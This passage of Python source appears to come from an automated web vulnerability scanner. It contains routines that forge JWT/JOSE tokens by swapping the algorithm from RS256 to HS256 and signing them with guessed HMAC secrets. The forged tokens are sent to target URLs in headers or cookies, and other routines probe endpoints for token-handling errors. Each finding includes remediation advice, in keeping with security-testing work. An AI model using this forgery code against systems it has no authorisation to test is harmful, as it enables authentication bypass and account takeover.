        modified_header['alg'] = 'HS256'

        # Try to sign with public key as HMAC secret
        header_b64 = base64.urlsafe_b64encode(json.dumps(modified_header).encode()).decode().rstrip('=')
        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload_data).encode()).decode().rstrip('=')

        # Use common public key patterns as HMAC secrets
        public_key_patterns = [
            '-----BEGIN PUBLIC KEY-----',
            'public_key',
            'rsa_public_key',
            'certificate'
        ]

        for pub_key in public_key_patterns:
            try:
                unsigned = f"{header_b64}.{payload_b64}"
                signature = hmac.new(pub_key.encode(), unsigned.encode(), hashlib.sha256).digest()
                sig_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')

                confused_token = f"{unsigned}.{sig_b64}"

                if await self._test_modified_jose_token(confused_token, url, session, token_location):
                    return VulnerabilityFinding(
                        url=url,
                        vuln_type="JOSE_ALGORITHM_SUBSTITUTION",
                        severity="Critical",
                        confidence=0.90,
                        payload=f"JOSE with algorithm substitution: {confused_token}",
                        evidence="Server vulnerable to JOSE algorithm substitution (RS256->HS256)",
                        discovered_at=datetime.now(),
                        impact_description="JOSE algorithm substitution allows token forgery using public key",
                        remediation="Explicitly validate JOSE algorithm and use separate keys for RSA and HMAC",
                        affected_parameter=token_location
                    )

            except Exception:
                continue

    except Exception as e:
        logger.debug(f"JOSE algorithm substitution test failed: {e}")

    return None

async def _test_modified_jose_token(self, modified_token: str, url: str, session: aiohttp.ClientSession,
                                  token_location: str) -> bool:
    """Test if server accepts a modified JOSE token"""
    try:
        if token_location.startswith("header_"):
            header_name = token_location.replace("header_", "")
            headers = {header_name: f"Bearer {modified_token}"}
            async with session.get(url, headers=headers, timeout=10) as response:
                return response.status not in [401, 403]

        elif token_location.startswith("cookie_"):
            cookie_name = token_location.replace("cookie_", "")
            cookies = {cookie_name: modified_token}
            async with session.get(url, cookies=cookies, timeout=10) as response:
                return response.status not in [401, 403]

    except Exception:
        pass

    return False

async def _test_jose_endpoint(self, endpoint_url: str, session: aiohttp.ClientSession) -> List[VulnerabilityFinding]:
    """Test JOSE-specific endpoints for vulnerabilities"""
    findings = []

    try:
        # Test if endpoint accepts JOSE tokens
        async with session.get(endpoint_url, timeout=10) as response:
            if response.status in [200, 401, 403]:  # Endpoint exists
                content = await response.text()

                # Look for JOSE-related errors or information
                jose_indicators = [
                    'jwt', 'jws', 'jwe', 'jose', 'json web token',
                    'invalid signature', 'expired token', 'malformed token'
                ]

                if any(indicator in content.lower() for indicator in jose_indicators):
                    # This endpoint handles JOSE tokens, test for vulnerabilities
                    finding = VulnerabilityFinding(
                        url=endpoint_url,
                        vuln_type="JOSE_ENDPOINT_DISCOVERED",
                        severity="Info",
                        confidence=0.70,
                        payload="JOSE endpoint discovery",
                        evidence=f"JOSE token handling endpoint discovered: {endpoint_url}",
                        discovered_at=datetime.now(),
                        impact_description="JOSE endpoint may be vulnerable to token manipulation attacks",
                        remediation="Ensure proper JOSE token validation and security measures",
                        affected_parameter="jose_endpoint"
                    )
                    findings.append(finding)
                    logger.info(f"🎯 JOSE ENDPOINT: {endpoint_url}")

    except Exception:
        pass

    return findings

# Additional helper methods for the other vulnerabilities would follow the same pattern...